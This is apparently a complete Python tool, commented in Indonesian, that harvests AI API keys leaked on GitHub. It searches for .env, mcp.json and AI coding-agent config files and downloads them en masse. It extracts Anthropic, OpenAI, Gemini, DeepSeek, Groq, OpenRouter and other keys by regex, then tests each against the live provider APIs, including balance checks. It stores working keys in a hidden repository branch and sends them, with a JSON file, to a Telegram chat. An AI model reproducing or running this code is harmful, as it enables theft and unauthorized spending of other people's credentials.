#!/usr/bin/env python3
"""
Ciro Fast AI Token Dredger (Direct Raw HTTP - Zero Clone)
=========================================================
Menyapu bersih ribuan file konfigurasi (.env, mcp.json, docker-compose)
langsung via raw HTTP streaming (0.05s per file) tanpa clone repo.
Mengekstrak dan memvalidasi live:
- OpenAI (sk-proj-..., sk-...)
- Anthropic Claude (sk-ant-api03-..., sk-ant-oat01-...)
- Google Gemini (AIzaSy...)
- DeepSeek (sk-...)
- Qwen / DashScope (sk-...)
- Devin AI (apk_..., devin_...)
- Grok (xai-...)
- Cline, Aider, Cursor, Claude Code, OpenAI Codex configurations
"""

import os
import sys
import json
import re
import time
import random
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

GH_PATS_RAW = os.getenv("GH_PAT", "")
GH_PATS = [p.strip() for p in GH_PATS_RAW.split(",") if p.strip()]
if not GH_PATS:
    for env_k in ["GH_PAT_1", "GH_PAT_2", "GH_PAT_3"]:
        val = os.getenv(env_k, "").strip()
        if val:
            GH_PATS.append(val)

_pat_index = 0
def get_next_gh_token():
    global _pat_index
    if not GH_PATS:
        return ""
    tok = GH_PATS[_pat_index % len(GH_PATS)]
    _pat_index += 1
    return tok
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "1936436999")

# --- REGEX PATTERNS UNTUK AI TOKENS ---
AI_PATTERNS = {
    "Claude": re.compile(r"sk-ant-(?:api03|oat01)-[a-zA-Z0-9_\-]{40,110}"),
    "OpenAI": re.compile(r"sk-proj-[a-zA-Z0-9_\-]{48,160}"),
    "DeepSeek": re.compile(r"sk-[a-f0-9]{32}"),
    "Qwen": re.compile(r"sk-[a-f0-9]{32}"),
    "Devin": re.compile(r"(?:apk|devin)_[a-zA-Z0-9_\-]{30,80}"),
    "OpenRouter": re.compile(r"sk-or-v1-[a-f0-9]{64}"),
    "Gemini": re.compile(r"AIzaSy[a-zA-Z0-9_\-]{33}"),
    "Grok": re.compile(r"xai-[a-zA-Z0-9_\-]{40,80}"),
    "Groq": re.compile(r"gsk_[a-zA-Z0-9_\-]{48,64}"),
    "Perplexity": re.compile(r"pplx-[a-zA-Z0-9_\-]{48,64}"),
    "Deepgram": re.compile(r"\b[0-9a-f]{40}\b")
}

def send_telegram(text):
    if not TELEGRAM_BOT_TOKEN:
        print("[Telegram]", text)
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = json.dumps({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

def send_telegram_doc(filename, caption=""):
    if not TELEGRAM_BOT_TOKEN or not os.path.exists(filename):
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    # boundary multipart
    boundary = "----CiroBoundary" + str(int(time.time()))
    body = []
    body.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{TELEGRAM_CHAT_ID}\r\n")
    if caption:
        body.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n")
    with open(filename, "rb") as f:
        file_bytes = f.read()
    body.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{os.path.basename(filename)}\"\r\nContent-Type: application/json\r\n\r\n")
    
    full_body = "".join(body).encode("utf-8") + file_bytes + f"\r\n--{boundary}--\r\n".encode("utf-8")
    req = urllib.request.Request(url, data=full_body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    try:
        urllib.request.urlopen(req, timeout=30)
        print(f"✅ Terkirim ke Telegram: {filename}")
    except Exception as e:
        print(f"Send doc error: {e}")

def gh_search(query, page=1):
    """Cari file via GitHub Code Search API."""
    url = f"https://api.github.com/search/code?q={urllib.parse.quote(query)}&per_page=100&page={page}"
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "CiroFastDredger-v1"
    }
    tok = get_next_gh_token()
    if tok:
        headers["Authorization"] = f"Bearer {tok}"
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
            return data.get("items", []), data.get("total_count", 0)
    except urllib.error.HTTPError as e:
        print(f"⚠️ Search error ({e.code}): {e.reason}")
        if e.code in (403, 429):
            time.sleep(15)
        return [], 0
    except Exception as e:
        print(f"⚠️ Search exc: {e}")
        return [], 0

def fetch_raw_content(item):
    """Download teks mentah langsung dari raw.githubusercontent.com (0.05s)."""
    repo = item.get("repository", {}).get("full_name")
    path = item.get("path")
    if not repo or not path:
        return None, None
    
    # URL mentah GitHub
    raw_url = f"https://raw.githubusercontent.com/{repo}/HEAD/{path}"
    headers = {"User-Agent": "Mozilla/5.0"}
    tok = get_next_gh_token()
    if tok:
        headers["Authorization"] = f"token {tok}"
    
    try:
        req = urllib.request.Request(raw_url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            content = resp.read().decode('utf-8', errors='ignore')
            return f"{repo}/{path}", content
    except Exception:
        return None, None


# === [PERSISTENT GOLD VAULT (ANTI DUPLIKAT TOKENS)] ========================
GOLD_STATE_FILE = "gold_tokens_vault.json"

def load_gold_vault():
    """Memuat semua token yang sudah pernah ditemukan dari remote branch 'state'."""
    known_tokens = set()
    sha = None
    tok = get_next_gh_token()
    if not tok:
        return known_tokens, sha
    owner = os.getenv("GITHUB_REPOSITORY_OWNER") or "ciroxtreme"
    repo_name = (os.getenv("GITHUB_REPOSITORY") or "ciroxtreme/ciro-scan").split("/")[-1]
    url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{GOLD_STATE_FILE}?ref=state"
    headers = {"Authorization": f"Bearer {tok}", "Accept": "application/vnd.github.v3+json", "User-Agent": "CiroGoldVault"}
    try:
        import base64
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode())
            sha = data.get("sha")
            raw_content = base64.b64decode(data.get("content", "")).decode("utf-8")
            vault_list = json.loads(raw_content)
            for item in vault_list:
                known_tokens.add(item.get("token"))
            print(f"📦 Brangkas Emas Termuat: {len(known_tokens)} token unik sudah ada di arsip.")
    except Exception:
        print("ℹ️ Brangkas Emas baru dibuat.")
    return known_tokens, sha

def save_gold_vault(new_gold_items):
    """Menyimpan akumulasi token emas baru ke branch 'state' (Database Terpusat)."""
    tok = get_next_gh_token()
    if not tok or not new_gold_items:
        return
    import base64
    owner = os.getenv("GITHUB_REPOSITORY_OWNER") or "ciroxtreme"
    repo_name = (os.getenv("GITHUB_REPOSITORY") or "ciroxtreme/ciro-scan").split("/")[-1]
    
    known_tokens, latest_sha = load_gold_vault()
    
    # Gabung dan dedup
    merged_vault = []
    seen = set()
    # Baca yang lama dulu
    url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{GOLD_STATE_FILE}?ref=state"
    headers = {"Authorization": f"Bearer {tok}", "Accept": "application/vnd.github.v3+json", "User-Agent": "CiroGoldVault"}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode())
            raw_content = base64.b64decode(data.get("content", "")).decode("utf-8")
            merged_vault = json.loads(raw_content)
            for item in merged_vault:
                seen.add(item.get("token"))
    except:
        pass
        
    for item in new_gold_items:
        if item.get("token") not in seen:
            seen.add(item.get("token"))
            merged_vault.append(item)
            
    payload_data = json.dumps(merged_vault, indent=2)
    b64_content = base64.b64encode(payload_data.encode("utf-8")).decode("utf-8")
    
    body = {
        "message": f"chore(vault): update gold tokens vault (Total: {len(merged_vault)} tokens)",
        "content": b64_content,
        "branch": "state"
    }
    if latest_sha:
        body["sha"] = latest_sha
        
    put_url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{GOLD_STATE_FILE}"
    try:
        req = urllib.request.Request(put_url, data=json.dumps(body).encode("utf-8"), headers={
            **headers, "Content-Type": "application/json"
        }, method="PUT")
        with urllib.request.urlopen(req, timeout=20) as resp:
            print(f"💾 Brangkas Emas Terupdate di branch 'state'! Total isi: {len(merged_vault)} token.")
    except Exception as e:
        print(f"⚠️ Gagal update brangkas state: {e}")

def validate_key_live(provider, key, extra=None):
    """Tes cepat ke endpoint resmi apakah key masih hidup & aktif."""
    try:
        if provider == "OpenAI":
            url = "https://api.openai.com/v1/models"
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif & Terdaftar"
        elif provider == "Claude":
            url = "https://api.anthropic.com/v1/messages"
            payload = json.dumps({"model": "claude-3-haiku-20240307", "max_tokens": 1, "messages": [{"role": "user", "content": "hi"}]}).encode()
            req = urllib.request.Request(url, data=payload, headers={
                "x-api-key": key, "anthropic-version": "2023-06-01", "Content-Type": "application/json"
            })
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif & Terdaftar"
        elif provider == "Gemini":
            # Cek generateContent langsung: buang semua free tier yang terkena rate limit
            url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key={key}"
            payload = json.dumps({"contents": [{"parts": [{"text": "ping"}]}]}).encode()
            req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif (Gemini Pay-As-You-Go / Aktif)"
        elif provider == "DeepSeek":
            url = "https://api.deepseek.com/user/balance"
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0", "Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                bdata = json.loads(resp.read().decode())
                if bdata.get("is_available"):
                    return True, "Aktif (Saldo Berisi)"
                else:
                    return False, "Saldo $0 / Habis"
        elif provider == "Groq":
            url = "https://api.groq.com/openai/v1/models"
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif (Groq Cloud)"
        elif provider == "Qwen":
            url = "https://dashscope.aliyuncs.com/compatible-mode/v1/models"
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif (Alibaba DashScope Qwen)"
        elif provider == "Devin":
            url = "https://api.devin.ai/v1/sessions"
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif (Cognition Devin AI)"
        elif provider == "OpenRouter":
            url = "https://openrouter.ai/api/v1/auth/key"
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                kdata = json.loads(resp.read().decode())
                usage = kdata.get("data", {}).get("usage", 0)
                limit = kdata.get("data", {}).get("limit", 0)
                return True, f"Aktif (OpenRouter usage: ${usage})"

    except urllib.error.HTTPError as e:
        if e.code == 429:
            if provider == "Gemini":
                return False, "Free Tier Rate-Limited (429)"
            return True, "Aktif (Rate Limit / Terpakai)"
        elif e.code == 402:
            return False, "Saldo $0 / Habis (402)"
        return False, f"HTTP {e.code}"
    except Exception as e:
        return False, str(e)
    return False, "Unchecked"

def main():
    queries = [
        # AI Coding Agents & Dev Tools (Cline, Cursor, Aider, Claude Code, Devin)
        "filename:.env OPENAI_API_KEY sk-proj-",
        "filename:.env ANTHROPIC_API_KEY sk-ant",
        "filename:.env CLAUDE_API_KEY sk-ant",
        "filename:.env DEVIN_API_KEY",
        "filename:.env OPENROUTER_API_KEY sk-or-v1-",
        "filename:.env CURSOR_API_KEY",
        "filename:cline_mcp_settings.json",
        "filename:.cursorrules API_KEY",
        "filename:.aider.conf.yml",
        "filename:.env.local ANTHROPIC_API_KEY",
        "filename:.env.local OPENAI_API_KEY",
        "filename:mcp.json ANTHROPIC_API_KEY",
        "filename:mcp.json OPENAI_API_KEY",
        "filename:.env DEEPSEEK_API_KEY sk-",
        "filename:.env DASHSCOPE_API_KEY sk-",
        "filename:.env QWEN_API_KEY sk-",
        "filename:.env GEMINI_API_KEY AIzaSy",
        "filename:.env GROQ_API_KEY gsk_",
    ]

    print("🚀 MEMULAI OPERASI FAST DREDGER (SEDOT RAW HTTP INSTAN)...")
    send_telegram(
        "🌊 <b>OPERASI BEDOL DESA DIMULAI!</b>\n\n"
        "⚡ <b>Mode:</b> Fast Raw HTTP Streamer (Nol Git Clone)\n"
        "🎯 <b>Target:</b> Menguras puluhan ribu kolam token AI (Claude, OpenAI, Gemini, DeepSeek, Pinecone)\n"
        "⏳ <i>Menyedot & memvalidasi token live...</i>"
    )

    all_raw_targets = []
    
    # 1. Kumpulkan daftar file target dari GitHub Code Search
    for q in queries:
        print(f"📡 Mencari query: {q}...")
        for p in range(1, 4): # 3 halaman terdepan per query = 300 target
            items, total = gh_search(q, page=p)
            if not items:
                break
            all_raw_targets.extend(items)
            print(f"   • Page {p}: dapat {len(items)} file (Total pool query: {total})")
            time.sleep(2) # jeda rate-limit search

    print(f"📦 Total target terkumpul: {len(all_raw_targets)} file mentah.")
    
    # 2. Sedot isi file secara paralel 25 worker (Super Cepat!)
    print("⚡ Menyedot isi file .env secara paralel (25 worker)...")
    downloaded_files = {}
    with ThreadPoolExecutor(max_workers=25) as executor:
        futs = {executor.submit(fetch_raw_content, it): it for it in all_raw_targets}
        for fut in as_completed(futs):
            src, text = fut.result()
            if src and text:
                downloaded_files[src] = text

    print(f"📥 Berhasil menyedot {len(downloaded_files)} file .env/config mentah!")

    # 3. Ekstraksi Token AI pakai Regex Kilat (ANTI DUPLIKAT DARI BRANGKAS)
    known_vault_tokens, _ = load_gold_vault()
    extracted_tokens = []
    seen_tokens = set(known_vault_tokens) # Jangan periksa lagi token yang sudah pernah disimpan!

    for src, text in downloaded_files.items():
        for prov, pattern in AI_PATTERNS.items():
            matches = pattern.findall(text)
            for m in matches:
                # filter token dummy
                if any(x in m.lower() for x in ["example", "your_key", "xxxx", "dummy", "placeholder", "changeme"]):
                    continue
                if m not in seen_tokens:
                    seen_tokens.add(m)
                    extracted_tokens.append((prov, m, src))

    print(f"🎯 Berhasil mengekstrak {len(extracted_tokens)} token kandidat unik!")

    # 4. Validasi Live Token (Hanya Simpan yang HIDUP!)
    print("🧪 Memvalidasi status keaktifan token ke endpoint resmi...")
    active_gold = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        val_futs = {executor.submit(validate_key_live, prov, tok): (prov, tok, src) for prov, tok, src in extracted_tokens}
        for fut in as_completed(val_futs):
            prov, tok, src = val_futs[fut]
            is_active, msg = fut.result()
            print(f"   [{prov}] {tok[:12]}... -> {'🟢 ' + msg if is_active else '🔴 ' + msg} ({src})")
            if is_active:
                active_gold.append({
                    "provider": prov,
                    "token": tok,
                    "source": src,
                    "status": msg
                })

    print(f"\n🏆 SELESAI! Ditemukan {len(active_gold)} TOKEN EMAS AKTIF!")

    # 5. Simpan Token Baru ke Brangkas Terpusat branch 'state'
    if active_gold:
        save_gold_vault(active_gold)

    report_file = "findings_gold_ai.json"
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(active_gold, f, indent=2)

    msg_lines = [
        "🏆 <b>LAPORAN HASIL OPERASI BEDOL DESA AI</b>",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"📦 <b>File .env Disedot:</b> {len(downloaded_files)} file",
        f"🔍 <b>Token Diekstrak:</b> {len(extracted_tokens)} kandidat",
        f"💎 <b>TOKEN EMAS AKTIF:</b> <b>{len(active_gold)} TOKEN</b>\n"
    ]

    if active_gold:
        for i, g in enumerate(active_gold[:15], 1):
            red = g['token'][:10] + "..." + g['token'][-6:]
            msg_lines.append(f"{i}. <b>[{g['provider']}]</b> {g['status']}\n   👉 <code>{red}</code>\n   📁 <i>{g['source']}</i>")
        if len(active_gold) > 15:
            msg_lines.append(f"\n<i>...dan {len(active_gold) - 15} token lainnya ada di file JSON terlampir!</i>")
    else:
        msg_lines.append("<i>Belum ada token aktif di batch ini, lanjut ke batch berikutnya!</i>")

    if active_gold:
        send_telegram("\n".join(msg_lines))
        send_telegram_doc(report_file, f"💎 File Emas Token AI ({len(active_gold)} Kunci Baru Ditemukan)")
    else:
        print("ℹ️ Tidak ada token baru yang ditemukan di run ini. Telegram hening (tidak nyampah).")

if __name__ == "__main__":
    main()
